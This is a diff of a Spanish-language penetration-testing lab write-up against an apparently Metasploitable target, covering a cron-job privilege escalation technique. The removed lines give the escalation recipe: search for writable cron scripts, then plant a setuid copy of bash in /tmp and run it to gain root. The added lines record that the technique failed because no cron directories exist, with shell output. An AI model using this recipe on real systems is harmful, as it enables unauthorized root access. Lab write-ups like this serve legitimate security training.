@@ -348,44 +348,31 @@ root
 
 **🎯 TÉCNICA 4: Explotación de Tareas Cron**
 
-**Paso 1: Revisar Tareas Cron**
+No se pudo ejectuar la técnica ya que el directorio `/etc/cron.\*` no se encuentra en la máquina objetivo.
 
-cat /etc/crontab
+A continuación se presenta la salida de las ejecuciones de los comandos usados para mostrar como el directorio no se encuentra en el objetivo.
 
-ls -la /etc/cron.\*
-
-crontab -l
-
-**Paso 2: Buscar Scripts Modificables**
-
-\# Buscar scripts ejecutados por cron
-
-find /etc/cron\* -type f -perm -o+w 2>/dev/null
-
-\# Buscar scripts en crontab
-
-cat /etc/crontab | grep -v "^#"
-
-**Paso 3: Modificar Script de Cron (si es posible)**
-
-\# Ejemplo: Si encuentras un script modificable ejecutado como root
-
-echo '#!/bin/bash' > /path/to/script.sh
-
-echo 'cp /bin/bash /tmp/rootbash' >> /path/to/script.sh
-
-echo 'chmod +s /tmp/rootbash' >> /path/to/script.sh
-
-\# Esperar a que cron ejecute el script
-
-\# Luego:
-
-/tmp/rootbash -p
-
-whoami  # root
-
------
-**
+```bash
+root@metasploitable:/home/msfadmin# ls -la /etc/cron.\*
+ls: cannot access /etc/cron.*: No such file or directory
+root@metasploitable:/home/msfadmin# crontab -l
+no crontab for root
+root@metasploitable:/home/msfadmin# 
+root@metasploitable:/home/msfadmin# ls -la /etc/cron.\*
+ls: cannot access /etc/cron.*: No such file or directory
+root@metasploitable:/home/msfadmin# crontab -l         
+no crontab for root
+root@metasploitable:/home/msfadmin# exit
+exit
+root@metasploitable:/home/msfadmin# end
+bash: end: command not found
+root@metasploitable:/home/msfadmin# 
+root@metasploitable:/home/msfadmin# logout
+bash: logout: not login shell: use `exit'
+root@metasploitable:/home/msfadmin# exit
+exit
+root@metasploitable:/home/msfadmin# 
+```
 
 ### 🎯 TÉCNICA 5: Explotación de Servicios Vulnerables
 
